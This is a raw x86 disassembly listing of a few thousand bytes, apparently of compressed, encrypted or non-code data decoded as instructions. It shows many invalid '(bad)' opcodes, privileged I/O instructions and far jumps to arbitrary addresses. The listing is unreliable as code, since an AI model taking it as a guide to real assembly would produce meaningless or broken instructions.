  415793:	pop    es
  415794:	mov    esi,0x223893b9
  415799:	imul   ebp,DWORD PTR [ebp-0x1dfd365b],0xe22c69a0
  4157a3:	das    
  4157a4:	jecxz  0x415770
  4157a6:	jmp    ebp
  4157a8:	adc    DWORD PTR [esi+0x3e],esi
  4157ab:	fwait
  4157ac:	stc    
  4157ad:	pop    ecx
  4157ae:	push   ds
  4157af:	out    dx,al
  4157b0:	xor    edi,0xe98f9358
  4157b6:	hlt    
  4157b7:	fnsave [esi]
  4157b9:	dec    edx
  4157ba:	dec    eax
  4157bb:	and    ebp,esp
  4157bd:	addr16 inc edx
  4157bf:	pop    ecx
  4157c0:	add    cl,BYTE PTR [eax+0x293e39bc]
  4157c6:	jae    0x41581d
  4157c8:	leave  
  4157c9:	out    0x97,eax
  4157cb:	iret   
  4157cc:	pop    ecx
  4157cd:	shl    BYTE PTR [esi-0x4e],1
  4157d0:	jb     0x415786
  4157d2:	pushf  
  4157d3:	ds jl  0x41575b
  4157d6:	out    dx,al
  4157d7:	push   ebx
  4157d8:	lock mov DWORD PTR [edi-0x45],edx
  4157dc:	sub    DWORD PTR [eax],esp
  4157de:	xchg   esp,eax
  4157df:	jnp    0x4157d8
  4157e1:	push   es
  4157e2:	cli    
  4157e3:	push   eax
  4157e4:	repnz outs dx,BYTE PTR ds:[esi]
  4157e6:	push   edx
  4157e7:	push   ebp
  4157e8:	fnstcw WORD PTR [ebp+0x6f]
  4157eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ec:	pop    ebp
  4157ed:	(bad)  
  4157ee:	lock test al,0x7e
  4157f1:	loope  0x4157f4
  4157f3:	mov    dh,BYTE PTR [ebx]
  4157f5:	mov    ecx,0x458dacbd
  4157fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157fb:	sub    eax,0xe445e8fe
  415800:	jnp    0x4157e4
  415802:	outs   dx,DWORD PTR ds:[esi]
  415803:	stos   DWORD PTR es:[edi],eax
  415804:	mov    ds:0x54a4171,eax
  415809:	lds    eax,FWORD PTR [eax]
  41580b:	std    
  41580c:	jl     0x415831
  41580e:	mov    ?,WORD PTR [edx+0x3b]
  415811:	jne    0x4157af
  415813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415814:	jmp    0x415806
  415816:	mov    cl,0x5b
  415818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415819:	xchg   esi,eax
  41581a:	and    al,0x26
  41581c:	inc    ebx
  41581d:	push   eax
  41581e:	pop    edx
  41581f:	pusha  
  415820:	lock xchg edx,eax
  415822:	sti    
  415823:	outs   dx,BYTE PTR ds:[esi]
  415824:	add    eax,0x92bb8aa2
  415829:	xor    ah,BYTE PTR [esi-0x7c]
  41582c:	inc    ecx
  41582d:	and    dl,BYTE PTR [edx]
  41582f:	mov    cl,0x48
  415831:	ret    
  415832:	and    eax,0xa85d8c33
  415837:	xchg   edx,eax
  415838:	test   eax,0x8d03acb7
  41583d:	add    ebx,edx
  41583f:	rol    DWORD PTR [ebx-0x3e],cl
  415842:	sub    eax,0xda1b4d77
  415847:	jbe    0x415865
  415849:	mov    dl,0xd5
  41584b:	push   esi
  41584c:	ss hlt 
  41584e:	dec    ecx
  41584f:	adc    ebp,ecx
  415851:	jmp    0x415899
  415853:	jmp    0x3263e3ad
  415858:	(bad)  
  415859:	mov    edx,0xcc280075
  41585e:	in     eax,dx
  41585f:	retf   0x3460
  415862:	fcom   QWORD PTR [edx+0x7e]
  415865:	sbb    edx,DWORD PTR [ebx]
  415867:	(bad)  ds:0x73492714
  41586d:	fdiv   st,st(7)
  41586f:	fisttp DWORD PTR fs:[edx+0x78]
  415873:	pop    ebx
  415874:	cmp    ch,0x96
  415877:	mov    bh,0x98
  415879:	stc    
  41587a:	popa   
  41587b:	(bad)  
  41587c:	pop    edx
  41587d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41587e:	popa   
  41587f:	sbb    BYTE PTR [edx-0x74],bh
  415882:	and    dl,BYTE PTR [eax+0x25c66e4d]
  415888:	imul   ebp,DWORD PTR [ebx],0x4656b3fe
  41588e:	push   edx
  41588f:	test   eax,0x988ed8e1
  415895:	imul   eax,edi,0x5c185b4a
  41589b:	daa    
  41589c:	fisub  WORD PTR [ecx]
  41589e:	sub    DWORD PTR [eax+0x6b332896],ebp
  4158a4:	popa   
  4158a5:	js     0x415834
  4158a7:	jnp    0x4158bc
  4158a9:	xchg   edi,eax
  4158aa:	jge    0x4158f4
  4158ac:	mov    ds:0x66a2a46d,eax
  4158b1:	icebp  
  4158b2:	(bad)  
  4158b3:	outs   dx,DWORD PTR ds:[esi]
  4158b4:	cwde   
  4158b5:	sub    BYTE PTR [esi],bh
  4158b7:	mov    ah,0xa8
  4158b9:	jge    0x4158a8
  4158bb:	(bad)  
  4158bc:	push   ds
  4158bd:	cmp    dl,BYTE PTR [edi]
  4158bf:	pop    ebp
  4158c0:	jle    0x4158b2
  4158c2:	cmp    DWORD PTR [ecx],0xffffffd7
  4158c5:	adc    dh,al
  4158c7:	cdq    
  4158c8:	or     bh,BYTE PTR [ecx]
  4158ca:	push   esi
  4158cb:	mov    al,ds:0xa13aab38
  4158d0:	ret    0x75e7
  4158d3:	enter  0x9b21,0xd6
  4158d7:	mov    dl,0x6c
  4158d9:	jo     0x415904
  4158db:	jmp    0x7eac33d6
  4158e0:	jge    0x4158df
  4158e2:	or     eax,0xe1dc3c53
  4158e7:	das    
  4158e8:	pop    ebx
  4158e9:	or     eax,ecx
  4158eb:	mov    ds:0xba616372,eax
  4158f0:	call   0x98dab634
  4158f5:	lahf   
  4158f6:	xor    eax,0xa73d8fc7
  4158fb:	scas   eax,DWORD PTR es:[edi]
  4158fc:	cmc    
  4158fd:	ret    0xa358
  415900:	gs inc ecx
  415902:	(bad)
  415905:	int3   
  415906:	test   DWORD PTR [ecx+0xf140ae],edx
  41590c:	sti    
  41590d:	dec    esp
  41590e:	adc    bh,BYTE PTR [esi]
  415910:	in     al,dx
  415911:	(bad)  
  415912:	xor    ebp,DWORD PTR [edx-0x74fbc557]
  415918:	sti    
  415919:	js     0x41595f
  41591b:	mov    edx,0x2291c697
  415920:	xor    eax,0x28f26cb4
  415925:	push   ss
  415926:	jmp    0x9c1a:0xc066581e
  41592d:	imul   edx,DWORD PTR [edx-0x7359a2f5],0xffffffcf
  415934:	jl     0x415907
  415936:	inc    ebp
  415937:	sar    ebp,0xdd
  41593a:	hlt    
  41593b:	test   al,0xad
  41593d:	pop    ebp
  41593e:	or     dh,BYTE PTR [ecx+0x7498d98c]
  415944:	jns    0x41593c
  415946:	add    DWORD PTR [edx+ebx*1],0x65
  41594a:	mov    esp,0x44f02e96
  41594f:	mov    edx,0x315a7768
  415954:	or     eax,0x937c2b33
  415959:	and    al,0x52
  41595b:	mov    BYTE PTR [esi-0x3f],cl
  41595e:	in     eax,dx
  41595f:	sub    ch,cl
  415961:	jl     0x41596d
  415963:	xchg   esp,eax
  415964:	into   
  415965:	(bad)  
  415966:	cmp    esi,DWORD PTR [esi]
  415968:	stc    
  415969:	loopne 0x4159c9
  41596b:	imul   eax,DWORD PTR [ecx-0x174da255],0x3e510ae
  415975:	int3   
  415976:	test   BYTE PTR [esi+0x0],dh
  415979:	mul    BYTE PTR [ebp-0x232ea70a]
  41597f:	pop    esp
  415980:	sti    
  415981:	adc    eax,0x7f4f4513
  415986:	mov    bl,0x64
  415988:	int3   
  415989:	std    
  41598a:	mov    ebp,0xdb6195dd
  41598f:	and    esp,DWORD PTR [esi]
  415991:	sbb    DWORD PTR [ecx+0x7d],ebx
  415994:	mov    eax,0x4053748d
  415999:	xchg   BYTE PTR [esi],bh
  41599b:	or     cl,dh
  41599d:	icebp  
  41599e:	pop    edx
  41599f:	jno    0x4159be
  4159a1:	test   eax,0x2015f909
  4159a6:	xor    ebx,DWORD PTR [ebx+eax*1-0x2e]
  4159aa:	ret    
  4159ab:	mov    dh,0x8c
  4159ad:	inc    edx
  4159ae:	jecxz  0x4159e4
  4159b0:	aad    0x16
  4159b2:	inc    edx
  4159b3:	pop    esi
  4159b4:	push   esp
  4159b5:	arpl   WORD PTR [esi],ax
  4159b7:	lods   al,BYTE PTR ds:[esi]
  4159b8:	(bad)  
  4159ba:	scas   al,BYTE PTR es:[edi]
  4159bb:	(bad)  
  4159bc:	adc    BYTE PTR [ecx-0x34],bl
  4159bf:	les    eax,FWORD PTR [edi-0x8548a7d]
  4159c5:	or     BYTE PTR [edx],ah
  4159c7:	mov    ecx,0x824a186c
  4159cc:	pop    es
  4159cd:	jmp    0xdde6:0x1e3f3039
  4159d4:	jle    0x4159c0
  4159d6:	and    BYTE PTR [esi],ch
  4159d8:	scas   al,BYTE PTR es:[edi]
  4159d9:	arpl   WORD PTR [ebx+0x5b],di
  4159dc:	mov    ecx,0xb2694ee9
  4159e1:	les    ebx,FWORD PTR [edi]
  4159e3:	add    DWORD PTR [eax],ebp
  4159e5:	cwde   
  4159e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159e7:	not    DWORD PTR [ebx-0x3fe1a09]
  4159ed:	push   ebp
  4159ee:	fs dec ecx
  4159f0:	outs   dx,DWORD PTR ds:[esi]
  4159f1:	ss adc al,0xee
  4159f4:	sub    DWORD PTR [esi+eiz*1],ebp
  4159f7:	or     DWORD PTR [edx+ebx*8],ebp
  4159fa:	leave  
  4159fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159fc:	mov    edi,0x1fbe929d
  415a01:	jno    0x415a17
  415a03:	xchg   cl,dl
  415a05:	fs sti 
  415a07:	pop    ebx
  415a08:	sbb    cl,BYTE PTR [ebx-0x56]
  415a0b:	(bad)  
  415a0c:	in     al,dx
  415a0d:	adc    eax,0xb9731cb7
  415a12:	push   ecx
  415a13:	outs   dx,BYTE PTR ds:[esi]
  415a14:	loope  0x4159c4
  415a16:	and    DWORD PTR [ebp+edi*8+0x671fabf7],0x39
  415a1e:	leave  
  415a1f:	repz (bad) 
  415a21:	stc    
  415a22:	call   0x8571e8ab
  415a27:	icebp  
  415a28:	addr16 in eax,0x85
  415a2b:	stc    
  415a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a2d:	jl     0x4159e5
  415a2f:	(bad)  
  415a30:	int3   
  415a31:	cwde   
  415a32:	sbb    BYTE PTR [esi-0x8a8c7f0],0x6f
  415a39:	jb     0x4159cd
  415a3b:	cmp    eax,0x97d4487c
  415a40:	shl    BYTE PTR [ebx],0x91
  415a43:	jecxz  0x415a9f
  415a45:	dec    ebp
  415a46:	mov    eax,ds:0x50fd0e7f
  415a4b:	aas    
  415a4c:	test   DWORD PTR [ebx+0x37808147],edi
  415a52:	xor    DWORD PTR [esi+ebp*4+0xb],esp
  415a56:	xlat   BYTE PTR ds:[ebx]
  415a57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a58:	cmc    
  415a59:	and    al,0x80
  415a5b:	repz mov eax,0xf74ff5ae
  415a61:	xchg   ebp,eax
  415a62:	push   esp
  415a63:	(bad)  
  415a64:	fidivr DWORD PTR [edx+0x3f]
  415a67:	imul   edx,ecx,0xed608b80
  415a6d:	or     al,0x7
  415a6f:	sub    al,0xea
  415a71:	ss lock fcom st(6)
  415a75:	loope  0x415a9f
  415a77:	adc    eax,DWORD PTR [ecx]
  415a79:	std    
  415a7a:	aad    0xa2
  415a7c:	addr16 imul ebx,esp,0xffffffd5
  415a80:	test   DWORD PTR [esi],edi
  415a82:	aam    0x7f
  415a84:	inc    edi
  415a85:	push   es
  415a86:	jle    0x415a45
  415a88:	pop    edi
  415a89:	ret    
  415a8a:	pop    ss
  415a8b:	xor    dh,BYTE PTR [ebp-0x6c]
  415a8e:	data16 je 0x415a39
  415a91:	mov    cs,WORD PTR [edi+0x50]
  415a94:	adc    al,0x29
  415a96:	cmp    al,0x6c
  415a98:	fisub  WORD PTR [ebp+0x1a]
  415a9b:	rol    DWORD PTR [ebp-0x4d],0x7b
  415a9f:	adc    al,0x1c
  415aa1:	outs   dx,DWORD PTR ds:[esi]
  415aa2:	scas   eax,DWORD PTR es:[edi]
  415aa3:	mov    ecx,fs
  415aa5:	push   edx
  415aa6:	inc    ebp
  415aa7:	aad    0x31
  415aa9:	mov    edi,0xf49c792e
  415aae:	push   eax
  415aaf:	mov    dl,0x42
  415ab1:	es cdq 
  415ab3:	xor    ebp,DWORD PTR [edx]
  415ab5:	ja     0x415ac6
  415ab7:	and    ecx,edx
  415ab9:	sbb    al,0xc9
  415abb:	and    eax,0x57ac351c
  415ac0:	fld    DWORD PTR [edx+0x7f6ecb82]
  415ac6:	rcl    BYTE PTR [ebx+ebx*4+0x6f],0x0
  415acb:	push   ebx
  415acc:	hlt    
  415acd:	out    dx,eax
  415ace:	in     al,0x49
  415ad0:	add    BYTE PTR [edx-0x4955b0f4],0xc0
  415ad7:	shr    DWORD PTR [esi+0x17],1
  415ada:	fcomi  st,st(7)
  415adc:	pop    edx
  415add:	sub    BYTE PTR [edi-0x3efd21e9],dh
  415ae3:	adc    eax,0xd18424a2
  415ae8:	add    ecx,0x40
  415aeb:	lods   al,BYTE PTR ds:[esi]
  415aec:	push   esi
  415aed:	fcmovne st,st(7)
  415aef:	xchg   edx,eax
  415af0:	push   esi
  415af1:	nop
  415af2:	int3   
  415af3:	xchg   edx,eax
  415af4:	rcl    DWORD PTR [eax],1
  415af6:	out    dx,al
  415af7:	inc    edx
  415af8:	inc    ebx
  415af9:	pop    edx
  415afa:	xchg   DWORD PTR [edx],edx
  415afc:	sbb    ecx,DWORD PTR [ecx-0x3a]
  415aff:	mov    ah,cl
  415b01:	test   ebx,edx
  415b03:	xchg   esp,eax
  415b04:	sub    esi,DWORD PTR [ecx]
  415b06:	push   ebx
  415b07:	fbstp  TBYTE PTR [edx]
  415b09:	jbe    0x415b1d
  415b0b:	pushf  
  415b0c:	in     al,0x69
  415b0e:	inc    esi
  415b0f:	add    ebp,DWORD PTR [esi+edi*2+0x24]
  415b13:	sbb    ch,dl
  415b15:	mov    ebp,0xb5e43db
  415b1a:	or     DWORD PTR [esi-0x64],0x71
  415b1e:	push   esi
  415b1f:	pop    esi
  415b20:	ret    0x78f8
  415b23:	shl    ah,cl
  415b25:	std    
  415b26:	adc    bh,cl
  415b28:	cmc    
  415b29:	repnz inc ebx
  415b2b:	addr16 inc ebp
  415b2d:	push   ebx
  415b2e:	lahf   
  415b2f:	mov    ebx,cs
  415b31:	xor    ebx,DWORD PTR [edi+0x75]
  415b34:	repnz mov cl,0x76
  415b37:	sqrtps xmm2,XMMWORD PTR [ebp+0x1d991dfc]
  415b3e:	aam    0xa1
  415b40:	jns    0x415b8b
  415b42:	or     BYTE PTR [ebp+0x216743a2],cl
  415b48:	inc    esp
  415b49:	mov    ah,0x78
  415b4b:	stos   DWORD PTR es:[edi],eax
  415b4c:	add    eax,0x5a41262b
  415b51:	dec    eax
  415b52:	ret    0x4988
  415b55:	adc    BYTE PTR [ecx-0x1c6cc04f],0x5e
  415b5c:	stos   DWORD PTR es:[di],eax
  415b5e:	push   edx
  415b5f:	arpl   WORD PTR [eax],dx
  415b61:	or     ebp,DWORD PTR [eax-0x63142230]
  415b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b68:	xchg   ebx,eax
  415b69:	sbb    ebx,DWORD PTR [edi]
  415b6b:	pop    eax
  415b6c:	cwde   
  415b6d:	adc    BYTE PTR [ebp+0x7a43e899],cl
  415b73:	pop    esi
  415b74:	mov    dh,al
  415b76:	mov    ch,0x73
  415b78:	jmp    0x415ba1
  415b7a:	cmp    BYTE PTR [ebp+0x26],dl
  415b7d:	repz inc ebx
  415b7f:	pop    ecx
  415b80:	(bad)  
  415b81:	sub    BYTE PTR ds:0xf2214a3e,cl
  415b87:	nop
  415b88:	jecxz  0x415b9e
  415b8a:	ret    0x2b9
  415b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b8e:	pop    esi
  415b8f:	int3   
  415b90:	idiv   DWORD PTR [ebx+0x30174b93]
  415b96:	mov    al,ds:0x88302d32
  415b9b:	daa    
  415b9c:	mov    esp,0x8caa3f0a
  415ba1:	mov    dl,0x8d
  415ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ba4:	mov    bh,0xa
  415ba6:	(bad)  
  415ba7:	fdiv   DWORD PTR [ecx]
  415ba9:	add    ecx,eax
  415bab:	das    
  415bac:	jle    0x415b95
  415bae:	inc    esp
  415baf:	pushf  
  415bb0:	pop    eax
  415bb1:	cli    
  415bb2:	pextrw ecx,(bad),0xc5
  415bb4:	psubusb mm7,mm6
  415bb7:	add    BYTE PTR [ecx],cl
  415bb9:	or     ecx,DWORD PTR ds:0x3fd5fca7
  415bbf:	xchg   dh,al
  415bc1:	test   DWORD PTR [esp+edi*8],0xa3744bd6
  415bc8:	xor    BYTE PTR [edx],ah
  415bca:	jge    0x415b67
  415bcc:	out    dx,eax
  415bcd:	aad    0x21
  415bcf:	fwait
  415bd0:	out    0xff,eax
  415bd2:	mov    edx,?
  415bd4:	push   ebx
  415bd5:	push   esp
  415bd6:	jo     0x415bb4
  415bd8:	xchg   DWORD PTR [ecx+0x2c46c3c2],ebx
  415bde:	cmc    
  415bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415be0:	sbb    BYTE PTR [edi+edx*2-0x28363a42],al
  415be7:	pop    ebx
  415be8:	sbb    dh,BYTE PTR [edx]
  415bea:	into   
  415beb:	push   ds
  415bec:	retf   0xe95f
  415bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf0:	(bad)  
  415bf1:	mov    dh,0x9d
  415bf3:	adc    ebx,ebx
  415bf5:	push   ss
  415bf6:	sar    BYTE PTR [eax-0x725bf551],cl
  415bfc:	pop    edx
  415bfd:	push   cs
  415bfe:	jg     0x415c26
  415c00:	add    al,0x43
  415c02:	lods   al,BYTE PTR ds:[esi]
  415c03:	(bad)  
  415c04:	lods   al,BYTE PTR ds:[esi]
  415c05:	ret    
  415c06:	xchg   edx,eax
  415c07:	mov    al,0xb6
  415c09:	scas   eax,DWORD PTR es:[edi]
  415c0a:	jo     0x415c4d
  415c0c:	mov    ds:0x3eb17d49,eax
  415c11:	dec    esi
  415c12:	pop    esp
  415c13:	test   eax,0x152d7156
  415c18:	inc    esi
  415c19:	add    BYTE PTR [edx-0x6e5fde4e],bh
  415c1f:	mov    edx,0xa7ce68f8
  415c24:	ins    DWORD PTR es:[edi],dx
  415c25:	cdq    
  415c26:	lds    ecx,FWORD PTR [ebx-0x7c]
  415c29:	sub    ebx,DWORD PTR [ecx-0x3f]
  415c2c:	push   ss
  415c2d:	sbb    edi,edi
  415c2f:	jnp    0x415c8c
  415c31:	xor    eax,0xc766d90
  415c36:	fimul  WORD PTR [ebx]
  415c38:	mov    ch,0xeb
  415c3a:	nop
  415c3b:	sbb    BYTE PTR ds:0xaafc425c,al
  415c41:	jae    0x415c87
  415c43:	ja     0x415c28
  415c45:	cmc    
  415c46:	inc    eax
  415c47:	mov    cl,0x69
  415c49:	adc    DWORD PTR [ebp+0x6bde329c],eax
  415c4f:	and    BYTE PTR gs:[esi],dl
  415c52:	test   al,0x64
  415c54:	mov    WORD PTR [ecx-0x12],es
  415c57:	sbb    BYTE PTR [ebx],0xc6
  415c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c5b:	dec    esp
  415c5c:	jecxz  0x415bf1
  415c5e:	jb     0x415c03
  415c60:	adc    edx,eax
  415c62:	aad    0xb4
  415c64:	or     esp,DWORD PTR [ebp+0x46574076]
  415c6a:	mov    al,ds:0xeb45a5ad
  415c6f:	fstp   DWORD PTR [ecx+0x5d626886]
  415c75:	stos   DWORD PTR es:[edi],eax
  415c76:	sub    BYTE PTR [ebx],dl
  415c78:	sbb    dh,BYTE PTR [esp+ebx*4-0x50]
  415c7c:	shl    esp,0xda
  415c7f:	dec    esi
  415c80:	fmul   QWORD PTR [edx-0x7e]
  415c83:	data16 mov cl,0x20
  415c86:	cmp    al,0xe5
  415c88:	(bad)  
  415c8a:	push   edi
  415c8b:	mov    BYTE PTR [esi],ch
  415c8d:	out    dx,eax
  415c8e:	push   edx
  415c8f:	add    BYTE PTR [ecx+0x2a09480b],dl
  415c95:	ss aad 0x0
	...
  415d14:	push   ebp
  415d15:	xlat   BYTE PTR ds:[ebx]
  415d16:	mov    edx,0x7defba87
  415d1b:	xlat   BYTE PTR ds:[ebx]
  415d1c:	lea    esp,[esi+edx*4+0x6a]
  415d20:	jmp    0x101:0xf0b43858
  415d27:	add    BYTE PTR [ebx+0x7],ch
  415d2a:	add    BYTE PTR [eax],al
  415d2c:	test   DWORD PTR [esi+0x647dd39],edx
  415d32:	ror    DWORD PTR [ebp-0x79],cl
  415d35:	sbb    esi,0x52
  415d38:	shl    BYTE PTR [edx+ebx*2],1
  415d3b:	fild   DWORD PTR [ebx-0x3c]
  415d3e:	test   BYTE PTR [ebx],dl
  415d40:	inc    ecx
  415d41:	outs   dx,DWORD PTR ds:[esi]
  415d42:	sbb    esp,esi
  415d44:	dec    esp
  415d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d46:	or     al,0x1b
  415d48:	mov    bl,BYTE PTR [esi+0x4aa97713]
  415d4e:	mov    ebx,0x6ecbfc99
  415d53:	in     al,0x61
  415d55:	das    
  415d56:	sbb    DWORD PTR [ecx],ebp
  415d58:	cli    
  415d59:	mov    esp,0x7f3f2c0c
  415d5e:	jecxz  0x415d28
  415d60:	xor    esp,edx
  415d62:	pop    es
  415d63:	mov    eax,0x178f9869
  415d68:	push   ecx
  415d69:	xchg   esi,edi
  415d6b:	test   ebp,0x743127c7
  415d71:	xchg   esi,eax
  415d72:	aad    0x3
  415d74:	pushf  
  415d75:	daa    
  415d76:	or     DWORD PTR gs:[ebx-0x40931333],ebx
  415d7d:	mov    dh,0xfc
  415d7f:	and    DWORD PTR [edi+ebx*2+0x2ff47468],edi
  415d86:	inc    ebp
  415d87:	adc    al,0xf2
  415d89:	add    eax,0x8a59c6e
  415d8e:	and    BYTE PTR [edi],0x34
  415d91:	mov    esp,edx
  415d93:	push   ecx
  415d94:	repz fldlg2 
  415d97:	dec    ebp
  415d98:	xchg   esi,eax
  415d99:	mov    dl,0x14
  415d9b:	sub    DWORD PTR [ecx-0x67a1de73],ebp
  415da1:	jbe    0x415dda
  415da3:	test   BYTE PTR [ebx],ch
  415da5:	adc    al,0x52
  415da7:	test   DWORD PTR [ecx-0x4e],0xee7de0bb
  415dae:	pusha  
  415daf:	nop
  415db0:	jecxz  0x415d82
  415db2:	gs stos BYTE PTR es:[edi],al
  415db4:	inc    esp
  415db5:	mov    edx,0x26123a93
  415dba:	repnz push eax
  415dbc:	scas   eax,DWORD PTR es:[edi]
  415dbd:	sub    dl,BYTE PTR [ebx+edi*2]
  415dc0:	ss jb  0x415dae
  415dc3:	inc    ebp
  415dc4:	fldcw  WORD PTR [ebx+0x5e17aeb3]
  415dca:	call   0x8817:0x77657451
  415dd1:	mov    bl,0x1e
  415dd3:	mov    al,ds:0x14c55880
  415dd8:	je     0x415d90
  415dda:	call   esp
  415ddc:	jg     0x415dd6
  415dde:	out    dx,al
  415ddf:	out    0x42,eax
  415de1:	add    DWORD PTR [ecx+0x2f396e02],esi
  415de7:	ja     0x415e51
  415de9:	(bad)  
  415dea:	and    BYTE PTR [ecx-0x14d07fb8],cl
  415df0:	mov    ds:0x383125c8,al
  415df5:	cmp    dl,al
  415df7:	loopne 0x415db6
  415df9:	dec    edx
  415dfa:	xlat   BYTE PTR ds:[ebx]
  415dfb:	or     DWORD PTR [edi+edx*1],edx
  415dfe:	pop    ebx
  415dff:	loopne 0x415e4a
  415e01:	jo     0x415dcf
  415e03:	sub    dl,ah
  415e05:	frstor ds:0x743ab8ed
  415e0b:	jecxz  0x415e1b
  415e0d:	imul   ebx,esi,0xde7384d3
  415e13:	or     BYTE PTR [eax+0x34],0xa8
  415e17:	test   al,0xfc
  415e19:	adc    ecx,edi
  415e1b:	jae    0x415e0e
  415e1d:	(bad)  
  415e1e:	stc    
  415e1f:	cwde   
  415e20:	popa   
  415e21:	(bad)  
  415e22:	cmp    esp,ebp
  415e24:	sub    eax,0x2bdc50f2
  415e29:	and    ebp,ecx
  415e2b:	cmc    
  415e2c:	out    0x18,al
  415e2e:	aas    
  415e2f:	and    al,0x1c
  415e31:	les    edi,FWORD PTR [edx+0x66]
  415e34:	mul    BYTE PTR [edi]
  415e36:	leave  
  415e37:	xor    eax,DWORD PTR [edx]
  415e39:	mov    dh,0x33
  415e3b:	les    eax,FWORD PTR [ebp+0x48796f56]
  415e41:	inc    eax
  415e42:	push   es
  415e43:	sbb    BYTE PTR [edx+0x555be91],ah
  415e49:	xlat   BYTE PTR ds:[ebx]
  415e4a:	xor    al,0xff
  415e4c:	sbb    al,0xc5
  415e4e:	popa   
  415e4f:	(bad)  
  415e50:	out    dx,eax
  415e51:	push   esi
  415e52:	cmp    eax,0x696ca289
  415e57:	pop    ebp
  415e58:	cmp    eax,0xed7f147e
  415e5d:	cmp    ebx,DWORD PTR [ebp-0x65e1f5a7]
  415e63:	cmp    BYTE PTR [ebp+0x680cc167],dh
  415e69:	(bad)  
  415e6a:	ja     0x415e0b
  415e6c:	movaps xmm7,XMMWORD PTR [eax+ecx*1-0x3db2dbe3]
  415e74:	loope  0x415ed3
  415e76:	(bad)  
  415e77:	lods   eax,DWORD PTR ds:[esi]
  415e78:	cmp    DWORD PTR [ebx+0x5f1b72ed],esi
  415e7e:	and    esi,ebp
  415e80:	adc    al,0x20
  415e82:	mov    dh,bl
  415e84:	jl     0x415e21
  415e86:	add    bl,BYTE PTR [eax+0x7fe58426]
  415e8c:	test   BYTE PTR [eax+0xdc1c64c],cl
  415e92:	and    cl,BYTE PTR [eax+eiz*1+0x17b14cb5]
  415e99:	xor    DWORD PTR [ebp-0x45accb0f],0x757cd85b
  415ea3:	les    edx,FWORD PTR [esi+0x57]
  415ea6:	icebp  
  415ea7:	inc    edx
  415ea8:	dec    esi
  415ea9:	or     eax,0x1418a63d
  415eae:	pop    esp
  415eaf:	dec    edi
  415eb0:	fadd   st(7),st
  415eb2:	xchg   esi,eax
  415eb3:	push   es
  415eb4:	pop    ss
  415eb5:	jle    0x415e93
  415eb7:	inc    ebp
  415eb8:	js     0x415e54
  415eba:	lea    edi,[ecx]
  415ebc:	mov    bh,0xba
  415ebe:	add    DWORD PTR [edx+0x7d],ebx
  415ec1:	xchg   edx,eax
  415ec2:	(bad)
  415ec6:	pop    ebp
  415ec7:	inc    ecx
  415ec8:	xchg   ebp,eax
  415ec9:	or     BYTE PTR [ebx],dl
  415ecb:	xchg   bl,ah
  415ecd:	push   ss
  415ece:	inc    eax
  415ecf:	pop    edi
  415ed0:	inc    esi
  415ed1:	in     eax,dx
  415ed2:	sub    BYTE PTR [ebx+0x46],0x7a
  415ed6:	push   ds
  415ed7:	dec    esp
  415ed8:	scas   al,BYTE PTR es:[edi]
  415ed9:	aaa    
  415eda:	inc    esi
  415edb:	out    0x5b,eax
  415edd:	pop    ebp
  415ede:	mov    edi,0x79156d1c
  415ee3:	xchg   esp,eax
  415ee4:	ret    0x2d58
  415ee7:	rcr    cl,1
  415ee9:	jmp    0xcbb8e8da
  415eee:	out    dx,eax
  415eef:	cld    
  415ef0:	std    
  415ef1:	mov    esi,0xb536c09
  415ef6:	xchg   esi,eax
  415ef7:	in     al,0xf4
  415ef9:	pop    eax
  415efa:	pop    eax
  415efb:	cmp    BYTE PTR [eax-0x1f41bbd2],bl
  415f01:	adc    al,0x53
  415f03:	lahf   
  415f04:	push   0x49
  415f06:	push   ecx
  415f07:	push   ebx
  415f08:	jae    0x415f3c
  415f0a:	sub    esi,ecx
  415f0c:	out    dx,al
  415f0d:	arpl   si,dx
  415f0f:	lock js 0x415ef2
  415f12:	jb     0x415f0e
  415f14:	das    
  415f15:	jecxz  0x415f2a
  415f17:	or     ebp,edx
  415f19:	mov    al,0xc3
  415f1b:	add    eax,DWORD PTR [eax+0x6d431860]
  415f21:	scas   al,BYTE PTR es:[edi]
  415f22:	fstp   TBYTE PTR ds:0x34a2056e
  415f28:	ss ret 
  415f2a:	out    dx,eax
  415f2b:	xlat   BYTE PTR ds:[ebx]
  415f2c:	sbb    edx,esi
  415f2e:	je     0x415f59
  415f30:	mov    WORD PTR [edx],ss
  415f32:	imul   ebx,DWORD PTR [esi+0x65],0x85826b64
  415f39:	mov    ah,0xc6
  415f3b:	xor    ebx,ebp
  415f3d:	add    edi,DWORD PTR [esi]
  415f3f:	sahf   
  415f40:	icebp  
  415f41:	adc    eax,0x944afa4c
  415f46:	add    BYTE PTR [esi],0xfd
  415f49:	mov    ds:0x4976d90,eax
  415f4e:	adc    esp,ebp
  415f50:	ja     0x415f8f
  415f52:	mov    bh,0x29
  415f54:	pop    DWORD PTR es:0xfa7dc33a
  415f5b:	jecxz  0x415f8c
  415f5d:	lds    edx,FWORD PTR [edx+esi*2]
  415f60:	lods   eax,DWORD PTR ds:[esi]
  415f61:	imul   ebp,DWORD PTR [ecx],0x6894c4bd
  415f67:	fdiv   QWORD PTR [edi+0x67d262e3]
  415f6d:	test   eax,0xa89fad14
  415f72:	addr16 push es
  415f74:	fpatan 
  415f76:	ror    eax,1
  415f78:	aas    
  415f79:	ins    BYTE PTR es:[edi],dx
  415f7a:	jns    0x415f35
  415f7c:	inc    ebx
  415f7d:	jnp    0x415fe1
  415f7f:	je     0x415f5f
  415f81:	sbb    al,0x93
  415f83:	lahf   
  415f84:	pop    ds
  415f85:	xchg   esi,eax
  415f86:	lods   eax,DWORD PTR ds:[esi]
